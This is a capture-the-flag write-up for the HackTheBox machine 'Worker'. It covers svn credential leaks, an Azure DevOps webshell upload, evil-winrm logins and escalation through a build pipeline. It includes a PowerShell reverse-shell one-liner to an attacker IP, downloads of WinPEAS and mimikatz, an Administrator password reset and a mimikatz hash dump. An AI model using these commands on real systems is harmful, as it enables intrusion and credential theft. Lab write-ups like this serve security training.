# Worker | HackTheBox

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- -T4 10.10.10.203
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 22:43 EDT
Nmap scan report for 10.10.10.203
Host is up (0.33s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   341.19 ms 10.10.14.1
2   341.16 ms 10.10.10.203

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 437.82 seconds
```
The machine is running Windows, with a HTTP server on 80 and a service called "Subversion" on port 3690. It is also running what appears to be another HTTP server on port 5985, but I know from previously seeing that port on other machines that this is actually WinRM.

### 2. Enumeration
I decided to start with the "svnserve Subversion" service. A quick search shows this to be a version control system (similar to git I guess?) which can host repositories for developers.  
  
*.The svnserve program is a lightweight server, capable of speaking to clients over TCP/IP using a custom, stateful protocol. Clients contact an svnserve server by using URLs that begin with the svn:// or svn+ssh:// scheme.*
  
I can use the svn utility to interact with the service and get more info.
I found a good reference on how to use the utility at: http://svnbook.red-bean.com/en/1.8/svn.ref.svn.html.  
Here is the repository information:
```bash
kali@kali:~$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020)
```
The commit log:
```bash
kali@kali:~$ svn log svn://10.10.10.203
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```
The root file list:
```bash
kali@kali:~$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
```
With this I can begin to explore a little further into the repo.
```bash
ali@kali:~$ svn ls svn://10.10.10.203/dimension.worker.htb/
LICENSE.txt
README.txt
assets/
images/
index.html
```
So it would appear we have some website source code here. Ideally I want to download this stuff so I can look at it properly offline.
```bash
kali@kali:~/Desktop/htb/worker$ svn checkout svn://10.10.10.203 .
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
...
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
```
I guess I should also download all the other revisions as well, although I can probably diff these from this server somehow.
```bash
kali@kali:~/Desktop/htb/worker/svn/rev1$ svn checkout -r 1 svn://10.10.10.203 .
kali@kali:~/Desktop/htb/worker/svn/rev2$ svn checkout -r 2 svn://10.10.10.203 .
kali@kali:~/Desktop/htb/worker/svn/rev3$ svn checkout -r 3 svn://10.10.10.203 .
kali@kali:~/Desktop/htb/worker/svn/rev4$ svn checkout -r 4 svn://10.10.10.203 .
```
And now to make that completely pointless I can diff each version from the current using svn.
```bash
kali@kali:~/Desktop/htb/worker/svn$ svn diff svn://10.10.10.203@5 svn://10.10.10.203@4
Index: moved.txt
===================================================================
--- moved.txt   (revision 5)
+++ moved.txt   (nonexistent)
@@ -1,5 +0,0 @@
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :)
-
kali@kali:~/Desktop/htb/worker/svn$ svn diff svn://10.10.10.203@5 svn://10.10.10.203@3
Index: moved.txt
===================================================================
--- moved.txt   (revision 5)
+++ moved.txt   (nonexistent)
@@ -1,5 +0,0 @@
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :)
-
Index: deploy.ps1
===================================================================
--- deploy.ps1  (nonexistent)
+++ deploy.ps1  (revision 3)
@@ -0,0 +1,7 @@
+$user = "nathen" 
+# NOTE: We cant have my password here!!!
+$plain = ""
+$pwd = ($plain | ConvertTo-SecureString)
+$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+$args = "Copy-Site.ps1"
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
\ No newline at end of file
kali@kali:~/Desktop/htb/worker/svn$ svn diff svn://10.10.10.203@5 svn://10.10.10.203@2
Index: moved.txt
===================================================================
--- moved.txt   (revision 5)
+++ moved.txt   (nonexistent)
@@ -1,5 +0,0 @@
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :)
-
Index: deploy.ps1
===================================================================
--- deploy.ps1  (nonexistent)
+++ deploy.ps1  (revision 2)
@@ -0,0 +1,6 @@
+$user = "nathen" 
+$plain = "wendel98"
+$pwd = ($plain | ConvertTo-SecureString)
+$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+$args = "Copy-Site.ps1"
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
kali@kali:~/Desktop/htb/worker/svn$ svn diff svn://10.10.10.203@5 svn://10.10.10.203@1
Index: moved.txt
===================================================================
--- moved.txt   (revision 5)
+++ moved.txt   (nonexistent)
@@ -1,5 +0,0 @@
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :)
-
```
These diffs reveal some interesting stuff, but most notably there is a plaintext password providing the first set of credentials - `nathen:wendel98`.  
Now to check out the web server. When browsing to the IP address, it appears to be an out-of-the-box IIS 10.0, which I know is fairly recent. As at this point I know some hostnames, so I add these to /etc/hosts and try accessing pages from hostname.

- worker.htb directs to the IIS 10 page.
- dimension.worker.htb directs to a site, which I'm guessing is the deployed version from the source found in the repo earlier.
  
Looking at the pages within dimension, it is basically a portfolio showing off some other sites which are hosted on the machine:
- alpha.worker.htb
- cartoon.worker.htb
- lens.worker.htb
- solidstate.worker.htb
- spectral.worker.htb
- story.worker.htb
  
These all get added to hosts as well. As I check them out, they all look to be default HTML5 UP sites. No working login forms, and no extra information.
  
That leaves devops.worker.htb, which is the most promising. It directs to a login prompt, using NTLM authorization. Using the previously-discovered credentials, I can login.

### 3. Check out the devops site
Past the login is an Azure devops site, running in context of WORKER\nathen on the machine. There is one project, SmartHotel360. The user's profile shows a full name of "Nathalie Henley" and an email of nathen@worker.htb.

There is also the repositories for all of the HTML5 UP sites present in the project. By exploring the functionality of the Azure DevOps application, it looks like I can make changes to each website from here, including modifying and adding files. This means I can most likely attempt to upload a file that will allow me to interact with the server and hopefully get a shell.

### 4. Get a (web)shell
The first thing to try is the ASPX shell within Kali. My only concern is that as it just provides a webshell, it will be force-pushed over before I can actually do much with it. Ideally I want a straight reverse shell, but for now I guess it will work. The steps to do this are as follows.
1. Create a new "dev" branch on the Spectral website repo.
2. Upload the webshell to the repo.
3. Make a pull request to the master and approve it.
4. Build it (from the "Pipelines" section).
5. Access the shell from the site.  
  
### 5. Enumerate from webshell
It's not ideal but I'll enumerate a bit from here and see where I can get to. Note: It looks like the webshell functionality will remain for a while so it's fine for enumeration. It turns out there is quite limited access from this foothold anyway.
```bash
whoami
iis apppool\defaultapppool

dir
Directory of c:\windows\system32\inetsrv

2020-03-28  15:58    <DIR>          .
2020-03-28  15:58    <DIR>          ..
2020-03-28  15:58           119ÿ808 appcmd.exe
2018-09-15  09:10             3ÿ810 appcmd.xml
2020-03-28  15:58           181ÿ760 AppHostNavigators.dll
2020-03-28  15:58            80ÿ896 apphostsvc.dll
2020-03-28  15:58           406ÿ016 appobj.dll
2020-03-28  15:58           131ÿ072 aspnetca.exe
2020-03-28  15:58            40ÿ448 authanon.dll
2020-03-28  15:58            52ÿ736 authsspi.dll
2020-03-28  15:58            24ÿ064 cachfile.dll
2020-03-28  15:58            52ÿ224 cachhttp.dll
2020-03-28  15:58            15ÿ872 cachtokn.dll
2020-03-28  15:58            14ÿ336 cachuri.dll
2020-03-28  15:58            43ÿ008 compdyn.dll
2020-03-28  15:58            54ÿ784 compstat.dll
2020-03-28  15:58    <DIR>          Config
2020-03-28  15:58            47ÿ104 custerr.dll
2020-03-28  15:58            20ÿ480 defdoc.dll
2020-03-28  15:58            24ÿ064 dirlist.dll
2020-03-28  15:58    <DIR>          en
2020-03-28  15:58    <DIR>          en-US
2020-03-28  15:58            68ÿ096 filter.dll
2020-03-28  15:58            38ÿ400 gzip.dll
2020-03-28  15:58            22ÿ016 httpmib.dll
2020-03-28  15:58            18ÿ432 hwebcore.dll
2020-03-28  15:58            63ÿ105 iis.msc
2020-03-28  15:58           307ÿ200 iiscore.dll
2020-03-28  15:58           110ÿ080 iisreg.dll
2020-03-28  15:58           231ÿ936 iisres.dll
2020-03-28  15:58            37ÿ888 iisrstas.exe
2020-03-28  15:58           192ÿ512 iissetup.exe
2020-03-28  15:58            57ÿ344 iissyspr.dll
2020-03-28  15:58            14ÿ848 iisual.exe
2020-03-28  15:58           284ÿ160 iisutil.dll
2020-03-28  15:58           612ÿ864 iisw3adm.dll
2020-03-28  15:58            49ÿ152 iiswsock.dll
2020-03-28  15:58           125ÿ440 InetMgr.exe
2020-03-28  15:58           131ÿ584 isapi.dll
2020-03-28  15:58            36ÿ352 loghttp.dll
2020-03-28  15:58           147ÿ456 Microsoft.Web.Administration.dll
2020-03-28  15:58         1ÿ052ÿ672 Microsoft.Web.Management.dll
2020-03-28  15:58            44ÿ032 modrqflt.dll
2020-03-28  15:58           478ÿ720 nativerd.dll
2020-03-28  15:58            27ÿ136 protsup.dll
2020-03-28  15:58            33ÿ792 rsca.dll
2020-03-28  15:58            51ÿ200 rscaext.dll
2020-03-28  15:58            40ÿ448 static.dll
2020-03-28  15:58           189ÿ952 uihelper.dll
2020-03-28  15:58            21ÿ504 validcfg.dll
2020-03-28  15:58            16ÿ384 w3ctrlps.dll
2020-03-28  15:58            29ÿ696 w3ctrs.dll
2020-03-28  15:58           109ÿ568 w3dt.dll
2020-03-28  15:58           101ÿ888 w3logsvc.dll
2020-03-28  15:58            29ÿ184 w3tp.dll
2020-03-28  15:58            26ÿ624 w3wp.exe
2020-03-28  15:58            78ÿ336 w3wphost.dll
2020-03-28  15:58            31ÿ744 wbhstipm.dll
2020-03-28  15:58            27ÿ648 wbhst_pm.dll
2020-03-28  15:58           480ÿ072 WebAdministration.mof
2020-03-28  15:58           379ÿ904 wmi-appserver.dll
2020-03-28  15:58           169ÿ984 XPath.dll
              57 File(s)      7ÿ281ÿ835 bytes

dir C:\Users\
 Directory of C:\Users

2020-07-07  17:53    <DIR>          .
2020-07-07  17:53    <DIR>          ..
2020-03-28  15:59    <DIR>          .NET v4.5
2020-03-28  15:59    <DIR>          .NET v4.5 Classic
2020-08-18  00:33    <DIR>          Administrator
2020-03-28  15:01    <DIR>          Public
2020-07-22  01:11    <DIR>          restorer
2020-07-08  19:22    <DIR>          robisl
               0 File(s)              0 bytes
               8 Dir(s)  10ÿ483ÿ879ÿ936 bytes free

fsutil fsinfo drives
Drives: C:\ W:\

dir "W:\" /S
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\

2020-06-16  18:59    <DIR>          agents
2020-03-28  15:57    <DIR>          AzureDevOpsData
2020-04-03  11:31    <DIR>          sites
2020-06-20  16:04    <DIR>          svnrepos
               0 File(s)              0 bytes

 Directory of W:\agents

2020-06-16  18:59    <DIR>          .
2020-06-16  18:59    <DIR>          ..
2020-04-02  22:05    <DIR>          agent01
2020-04-02  22:05    <DIR>          agent02
2020-06-16  18:57    <DIR>          agent10
2020-06-16  18:57    <DIR>          agent11
2020-06-16  18:57    <DIR>          agent12
...
(Agent stuff takes up like 99% of the returned output)
...
 Directory of W:\svnrepos\www

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  15:30    <DIR>          conf
2020-06-20  15:52    <DIR>          db
2020-06-20  11:29                 2 format
2020-06-20  11:29    <DIR>          hooks
2020-06-20  11:29    <DIR>          locks
2020-06-20  11:29               251 README.txt
               2 File(s)            253 bytes

 Directory of W:\svnrepos\www\conf

2020-06-20  15:30    <DIR>          .
2020-06-20  15:30    <DIR>          ..
2020-06-20  11:29             1ÿ112 authz
2020-06-20  11:29               904 hooks-env.tmpl
2020-06-20  15:27             1ÿ031 passwd        <------- This looks interesting
2020-04-04  20:51             4ÿ454 svnserve.conf
               4 File(s)          7ÿ501 bytes

 Directory of W:\svnrepos\www\db

2020-06-20  15:52    <DIR>          .
2020-06-20  15:52    <DIR>          ..
2020-06-20  15:52                 2 current
2020-06-20  11:29                41 format
2020-06-20  11:29                 5 fs-type
2020-06-20  11:29            11ÿ035 fsfs.conf
2020-06-20  11:29                 2 min-unpacked-rev
2020-06-20  15:52             8ÿ192 rep-cache.db
2020-06-20  15:52                 0 rep-cache.db-journal
2020-06-20  11:29    <DIR>          revprops
2020-06-20  11:29    <DIR>          revs
2020-06-20  15:52    <DIR>          transactions
2020-06-20  15:52                 2 txn-current
2020-06-20  11:29                 0 txn-current-lock
2020-06-20  15:52    <DIR>          txn-protorevs
2020-06-20  11:29                74 uuid
2020-06-20  11:29                 0 write-lock
              11 File(s)         19ÿ353 bytes

 Directory of W:\svnrepos\www\db\revprops

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  15:52    <DIR>          0
               0 File(s)              0 bytes

 Directory of W:\svnrepos\www\db\revprops\0

2020-06-20  15:52    <DIR>          .
2020-06-20  15:52    <DIR>          ..
2020-06-20  11:29                50 0
2020-06-20  15:43               108 1
2020-06-20  15:45               118 2
2020-06-20  15:46                95 3
2020-06-20  15:50               176 4
2020-06-20  15:52               133 5
               6 File(s)            680 bytes

 Directory of W:\svnrepos\www\db\revs

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  15:52    <DIR>          0
               0 File(s)              0 bytes

 Directory of W:\svnrepos\www\db\revs\0

2020-06-20  15:52    <DIR>          .
2020-06-20  15:52    <DIR>          ..
2020-06-20  11:29               253 0
2020-06-20  15:43         1ÿ981ÿ492 1
2020-06-20  15:45               898 2
2020-06-20  15:46               662 3
2020-06-20  15:50               358 4
2020-06-20  15:52               814 5
               6 File(s)      1ÿ984ÿ477 bytes

 Directory of W:\svnrepos\www\db\transactions

2020-06-20  15:52    <DIR>          .
2020-06-20  15:52    <DIR>          ..
               0 File(s)              0 bytes

 Directory of W:\svnrepos\www\db\txn-protorevs

2020-06-20  15:52    <DIR>          .
2020-06-20  15:52    <DIR>          ..
               0 File(s)              0 bytes

 Directory of W:\svnrepos\www\hooks

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  11:29             2ÿ651 post-commit.tmpl
2020-06-20  11:29             2ÿ780 post-lock.tmpl
2020-06-20  11:29             3ÿ008 post-revprop-change.tmpl
2020-06-20  11:29             2ÿ609 post-unlock.tmpl
2020-06-20  11:29             4ÿ051 pre-commit.tmpl
2020-06-20  11:29             3ÿ690 pre-lock.tmpl
2020-06-20  11:29             3ÿ516 pre-revprop-change.tmpl
2020-06-20  11:29             3ÿ370 pre-unlock.tmpl
2020-06-20  11:29             3ÿ763 start-commit.tmpl
               9 File(s)         29ÿ438 bytes

 Directory of W:\svnrepos\www\locks

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  11:29               142 db-logs.lock
2020-06-20  11:29               142 db.lock
               2 File(s)            284 bytes

     Total Files Listed:
           56537 File(s) 15ÿ723ÿ572ÿ779 bytes
           26469 Dir(s)  18ÿ753ÿ015ÿ808 bytes free
```
In the svnrepos/www/conf directory there is a "passwd" file. Reading this provides a list of example passwords for svn.
```bash
type "W:\svnrepos\www\conf\passwd"

### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```
I can see that the working credentials for the user nathen are in this file. Looking at the user directories in C:\Users, there is a user called "robisl", who also has a matching password in this file. This means we most likely have a second set of credentials - `robisl:wolves11`

### 6. Access the user
I can now use WinRM to access the machine as the user.
```bash
kali@kali:~$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents> whoami
worker\robisl
```

### 7. Enumerate some more
There's not actually that much to enumerate from this user through WinRM, as I already looked through the Program Files, and Web-related files. But I do a bit more anyway, as well as running an enum script (see winpeasout.txt):
```bash
*Evil-WinRM* PS C:\Users\robisl\Pictures\.temp> wget "http://10.10.15.53:8000/winPEAS.exe" -OutFile "WinPEAS.exe"
*Evil-WinRM* PS C:\Users\robisl\Pictures\.temp> ./winPEAS.exe > winpeasout.txt
```
Some interesting points:
- No AV was detected.
- WinPEAs detected possible DLL binary hijacking in the W:\agents\..\AgentServices.exe binary.
- Port 64517 is listening internally.
- AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe, apparently searching for creds is a good idea.
  
I got excited about there not being AV and tried Mimikatz, but of course since I wasn't local admin this was a fail.
```bash
*Evil-WinRM* PS C:\Users\robisl\Pictures\.temp> ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(commandline) # exit
Bye!
```
Investigating the other points didn't lead to anything either. At this point, the next step is to take these new creds and retrace my steps as the different user where possible. In the devops site, this gets me into a new account, under the full name of "Robin Islip".
Accessible from this account is a project called "PartsUnlimited" with a repository. The difference with this repo is, there does not appear to be any "live" version of it currently. Also, there is no established build pipeline. Creating a new build pipeline can be done a number of different ways and is well documented by Microsoft: https://docs.microsoft.com/en-us/azure/devops/pipelines/yaml-schema?view=azure-devops&tabs=schema%2Cparameter-schema
  
### 8. Escalate privileges
When reading the above documentation and from reading the console output given when I was building the spectral app, I know that the build process obviously executes commands on the server. There can be specified using a "script" param given in the build .yml config.
To get some more info on my privileges before I get too excited about this, I can run a simple "whoami".
```yaml
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

steps:
- script: whoami
  displayName: 'See who I am'
```
I can then save and run this script, creating a new pipeline. As it runs, the output is displayed in the web console.
```bash
whoami
nt authority/system
```

### 9. Get system
I make a powershell reverse shell to run through the build pipeline. Because AV is off
```yaml
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

steps:
- script: powershell -command "$client = New-Object System.Net.Sockets.TCPClient("10.10.15.53",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  displayName: 'Do nothing bad'
```
Sadly this doesn't work - I get a "this operation was cancelled" message was no other info. It is possible Azure DevOps is interfering somehow. I can try something a bit simpler and just make a new admin user.
```yaml
steps:
- script: net user Administrator jib1337JIB1337!
  displayName: 'Do nothing bad'
```
When running, this time I get the oh-so-glorious "This command completed successfully." message! Now I can login to the Administrator using WinRM.
```bash
kali@kali:~$ evil-winrm -u Administrator -p jib1337JIB1337! -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
worker\administrator
```

### Bonus credential dumping
Gonan repeat my mimikatz stuff from before for fun.
```bash
*Evil-WinRM* PS C:\Users\Administrator\Pictures\.temp> wget "http://10.10.15.53:8000/mimikatz.exe" -OutFile "mimikatz.exe"
*Evil-WinRM* PS C:\Users\Administrator\Pictures\.temp> ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 710847 (00000000:000ad8bf)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WORKER
Logon Server      : WORKER
Logon Time        : 2020-09-04 08:32:56
SID               : S-1-5-21-3082756831-2119193761-3468718151-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WORKER
         * NTLM     : c699db8a49441d1a9764bdfe3fcbd84f
         * SHA1     : 75d6eb5bfa5a2fb242cf10f4f4f6aca2c99d01c6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WORKER
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WORKER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1831398 (00000000:001bf1e6)
Session           : Batch from 0
User Name         : restorer
Domain            : WORKER
Logon Server      : WORKER
Logon Time        : 2020-09-04 08:53:00
SID               : S-1-5-21-3082756831-2119193761-3468718151-1452
        msv :
         [00000003] Primary
         * Username : restorer
         * Domain   : WORKER
         * NTLM     : 399aa90d030a5f41bde1481fc6734ffb
         * SHA1     : 216c8e790fa90513e6bae2d6d04488791769390f
        tspkg :
        wdigest :
         * Username : restorer
         * Domain   : WORKER
         * Password : (null)
        kerberos :
         * Username : restorer
         * Domain   : WORKER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:49
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 94217 (00000000:00017009)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:48
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : SQLTELEMETRY$SQLEXPRESS
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46465 (00000000:0000b581)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:46
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WORKER$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:45
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : worker$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 514156 (00000000:0007d86c)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WORKER
Logon Server      : WORKER
Logon Time        : 2020-09-04 08:32:15
SID               : S-1-5-21-3082756831-2119193761-3468718151-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WORKER
         * NTLM     : c699db8a49441d1a9764bdfe3fcbd84f
         * SHA1     : 75d6eb5bfa5a2fb242cf10f4f4f6aca2c99d01c6
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WORKER
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WORKER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 217806 (00000000:000352ce)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2020-09-04 08:30:07
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WORKER$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:46
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : worker$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:47
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 47734 (00000000:0000ba76)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:46
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 47710 (00000000:0000ba5e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2020-09-04 08:29:46
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : WORKER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```
